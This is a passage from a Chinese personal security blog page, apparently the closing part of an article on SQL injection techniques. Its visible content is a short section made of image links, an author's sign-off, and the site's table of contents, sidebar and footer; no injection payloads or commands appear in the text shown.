+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxpdoa8zj30et045a9y.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxqtmupmj30rv07e0t6.jpg" alt=""></p>
+<h2 id="N问题"><a href="#N问题" class="headerlink" title="\N问题"></a>\N问题</h2><p>这里给出两张图，大家就明白了，利用姿势的话各位师傅肯定比我会多…</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxskypu9j30fr0b8aa8.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxt7oic4j30j40ajwev.jpg" alt=""></p>
+<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>文采有限，措辞轻浮，内容浅显，操作生疏，如有任何不对的地方，还望各位师傅指出，以免误人子弟，万分感谢</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/moresql/">又双叒叕谈注入</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2019年08月05日 - 21:08</p>
+  <p><span>最后更新:</span>2019年08月07日 - 11:08</p>
+  <p><span>原始链接:</span><a href="/moresql/" title="又双叒叕谈注入">https://lengjibo.github.io/moresql/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/moresql/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/movie1/" rel="next" title="哪吒之魔童降世影评">
+                <i class="fa fa-chevron-left"></i> 哪吒之魔童降世影评
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table Des Matières
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ensemble
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.screenshot.net/9zoe9ax"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-name">articles</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">88</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://nsroms.com/" title="philipzou" target="_blank">philipzou</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL约束攻击"><span class="nav-number">2.</span> <span class="nav-text">SQL约束攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by后的注入"><span class="nav-number">3.</span> <span class="nav-text">order by后的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insert、update、delete后的注入"><span class="nav-number">4.</span> <span class="nav-text">insert、update、delete后的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http分割注入"><span class="nav-number">5.</span> <span class="nav-text">http分割注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#desc相关问题"><span class="nav-number">6.</span> <span class="nav-text">desc相关问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#万能密码"><span class="nav-number">7.</span> <span class="nav-text">万能密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#N问题"><span class="nav-number">8.</span> <span class="nav-text">\N问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写在后面"><span class="nav-number">9.</span> <span class="nav-text">写在后面</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Thème – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
